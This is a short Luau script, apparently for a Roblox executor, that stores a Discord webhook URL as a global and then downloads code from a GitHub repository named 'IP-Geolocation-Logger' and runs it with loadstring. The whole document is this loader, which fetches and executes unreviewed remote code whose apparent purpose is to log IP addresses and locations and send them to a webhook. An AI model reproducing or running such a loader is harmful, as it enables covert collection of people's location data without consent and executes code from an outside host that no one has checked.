getgenv()["Webhook URL"] = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"

local success, response = pcall(function()
	return game:HttpGet("https://raw.githubusercontent.com/mcantcode/IP-Geolocation-Logger/refs/heads/main/src/main.luau")
end)

if success then
	loadstring(response)()
else
	return
end
